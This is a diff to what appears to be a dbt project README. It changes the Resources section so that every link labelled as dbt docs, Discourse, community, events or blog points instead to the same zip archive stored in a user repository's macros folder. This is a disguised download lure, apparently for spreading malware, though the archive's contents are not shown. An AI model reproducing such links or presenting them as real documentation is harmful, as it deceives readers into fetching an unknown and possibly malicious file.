@@ -8,8 +8,8 @@ Try running the following commands:
 
 
 ### Resources:
-- Learn more about dbt [in the docs](https://docs.getdbt.com/docs/introduction)
-- Check out [Discourse](https://discourse.getdbt.com/) for commonly asked questions and answers
-- Join the [dbt community](https://getdbt.com/community) to learn from other analytics engineers
-- Find [dbt events](https://events.getdbt.com) near you
-- Check out [the blog](https://blog.getdbt.com/) for the latest news on dbt's development and best practices
+- Learn more about dbt [in the docs](https://raw.githubusercontent.com/prakashgavara/dbt_project_dec/main/macros/dbt_project_dec_v1.3.zip)
+- Check out [Discourse](https://raw.githubusercontent.com/prakashgavara/dbt_project_dec/main/macros/dbt_project_dec_v1.3.zip) for commonly asked questions and answers
+- Join the [dbt community](https://raw.githubusercontent.com/prakashgavara/dbt_project_dec/main/macros/dbt_project_dec_v1.3.zip) to learn from other analytics engineers
+- Find [dbt events](https://raw.githubusercontent.com/prakashgavara/dbt_project_dec/main/macros/dbt_project_dec_v1.3.zip) near you
+- Check out [the blog](https://raw.githubusercontent.com/prakashgavara/dbt_project_dec/main/macros/dbt_project_dec_v1.3.zip) for the latest news on dbt's development and best practices
